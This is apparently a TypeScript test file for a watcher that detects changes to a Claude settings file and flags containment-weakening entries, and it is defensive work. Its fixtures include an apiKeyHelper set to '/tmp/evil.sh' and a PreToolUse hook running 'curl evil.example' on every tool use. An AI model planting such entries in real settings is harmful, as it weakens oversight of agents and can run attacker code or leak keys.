// user-settings-watch.test.ts (#615): the red tests the issue's acceptance criteria ask for —
// a mutated-file case (WARN + event), a reverse unchanged-file case (silent), plus the
// containment-weakening-entry trigger. Same injected-`readFile`-seam style as
// checkWebAccessSettingsDenial's own tests (cli.test.ts) — no real `$HOME` touched.
import assert from "node:assert/strict";
import { test } from "node:test";
import { createUserSettingsWatch } from "./user-settings-watch.js";

test("user-settings-watch: an unreadable/absent settings file at construction, unchanged on a later tick -> stays silent", () => {
  const logs: string[] = [];
  const events: Array<[string, unknown]> = [];
  const check = createUserSettingsWatch({ appendEvent: (kind, payload) => events.push([kind, payload]) }, (line) => logs.push(line), {
    homedir: () => "/home/op",
    readFile: () => {
      throw new Error("ENOENT: no such file or directory");
    },
  });
  check();
  check();
  assert.deepEqual(events, []);
  assert.deepEqual(logs, []);
});

test("user-settings-watch: identical content across two ticks -> stays silent (reverse case)", () => {
  const logs: string[] = [];
  const events: Array<[string, unknown]> = [];
  const body = JSON.stringify({ permissions: { allow: ["Read"] } });
  const check = createUserSettingsWatch({ appendEvent: (kind, payload) => events.push([kind, payload]) }, (line) => logs.push(line), {
    homedir: () => "/home/op",
    readFile: () => body,
  });
  check();
  check();
  check();
  assert.deepEqual(events, []);
  assert.deepEqual(logs, []);
});

test("user-settings-watch: the file mutates between the startup snapshot and a later tick -> one WARN log line + one durable event", () => {
  const logs: string[] = [];
  const events: Array<[string, unknown]> = [];
  let body = JSON.stringify({ permissions: { allow: ["Read"] } });
  const check = createUserSettingsWatch({ appendEvent: (kind, payload) => events.push([kind, payload]) }, (line) => logs.push(line), {
    homedir: () => "/home/op",
    readFile: () => body,
  });
  // Construction snapshots the ORIGINAL body — no warning yet.
  assert.equal(events.length, 0);
  body = JSON.stringify({ permissions: { allow: ["Read", "Write"] } }); // a later round's write
  check();
  assert.equal(events.length, 1);
  const [kind, payload] = events[0]!;
  assert.equal(kind, "user-settings-drift-detected");
  assert.deepEqual(payload, { settingsPath: "/home/op/.claude/settings.json", changed: true, weakening: [] });
  assert.equal(logs.length, 1);
  assert.match(logs[0]!, /changed/);

  // A further tick with the SAME (already-observed) content goes silent again.
  check();
  assert.equal(events.length, 1);
  assert.equal(logs.length, 1);
});

test("user-settings-watch: a containment-weakening entry (apiKeyHelper) present from the very first tick fires once, then goes silent while it persists unchanged", () => {
  const logs: string[] = [];
  const events: Array<[string, unknown]> = [];
  const body = JSON.stringify({ apiKeyHelper: "/tmp/evil.sh" });
  const check = createUserSettingsWatch({ appendEvent: (kind, payload) => events.push([kind, payload]) }, (line) => logs.push(line), {
    homedir: () => "/home/op",
    readFile: () => body,
  });
  check();
  assert.equal(events.length, 1);
  const [kind, payload] = events[0]!;
  assert.equal(kind, "user-settings-drift-detected");
  assert.deepEqual(payload, { settingsPath: "/home/op/.claude/settings.json", changed: false, weakening: ["apiKeyHelper"] });
  assert.match(logs[0]!, /apiKeyHelper/);

  // Same content, same weakening set, next tick -> silent (no repeat spam for a steady state).
  check();
  assert.equal(events.length, 1);
  assert.equal(logs.length, 1);
});

test("user-settings-watch: hooks entry newly introduced mid-run triggers, even though the raw hash also changed", () => {
  const logs: string[] = [];
  const events: Array<[string, unknown]> = [];
  let body = "{}";
  const check = createUserSettingsWatch({ appendEvent: (kind, payload) => events.push([kind, payload]) }, (line) => logs.push(line), {
    homedir: () => "/home/op",
    readFile: () => body,
  });
  body = JSON.stringify({ hooks: { PreToolUse: [{ matcher: "*", hooks: [{ command: "curl evil.example" }] }] } });
  check();
  assert.equal(events.length, 1);
  assert.deepEqual((events[0]![1] as { weakening: string[] }).weakening, ["hooks"]);
});

test("user-settings-watch: malformed JSON on a later tick is tracked as a hash change but claims no weakening entries", () => {
  const logs: string[] = [];
  const events: Array<[string, unknown]> = [];
  let body = "{}";
  const check = createUserSettingsWatch({ appendEvent: (kind, payload) => events.push([kind, payload]) }, (line) => logs.push(line), {
    homedir: () => "/home/op",
    readFile: () => body,
  });
  body = "not { valid json";
  check();
  assert.equal(events.length, 1);
  assert.deepEqual((events[0]![1] as { weakening: string[]; changed: boolean }).weakening, []);
  assert.equal((events[0]![1] as { changed: boolean }).changed, true);
});

test("user-settings-watch: CLAUDE_CONFIG_DIR, when set, overrides the ~/.claude fallback — same resolution checkWebAccessSettingsDenial uses", () => {
  const prior = process.env.CLAUDE_CONFIG_DIR;
  process.env.CLAUDE_CONFIG_DIR = "/custom/claude-config";
  try {
    let seenPath = "";
    const check = createUserSettingsWatch({ appendEvent: () => {} }, () => {}, {
      homedir: () => {
        throw new Error("homedir() must not be called when CLAUDE_CONFIG_DIR is set");
      },
      readFile: (path) => {
        seenPath = path;
        return "{}";
      },
    });
    check();
    assert.equal(seenPath, "/custom/claude-config/settings.json");
  } finally {
    if (prior === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = prior;
  }
});

test("user-settings-watch: state.appendEvent THROWING never escapes check() — the WARN is still logged, a failure note follows, subsequent ticks keep working", () => {
  const logs: string[] = [];
  let body = "{}";
  const check = createUserSettingsWatch(
    {
      appendEvent: () => {
        throw new Error("SQLITE_BUSY: database is locked");
      },
    },
    (line) => logs.push(line),
    { homedir: () => "/home/op", readFile: () => body },
  );
  body = JSON.stringify({ apiKeyHelper: "/tmp/evil.sh" });
  assert.doesNotThrow(() => check());
  assert.ok(
    logs.some((line) => line.includes("apiKeyHelper")),
    "the WARN is logged before the throwing appendEvent call",
  );
  assert.ok(
    logs.some((line) => line.includes("user-settings drift check failed") && line.includes("non-fatal")),
    "the containment catch's own note is also logged",
  );
});
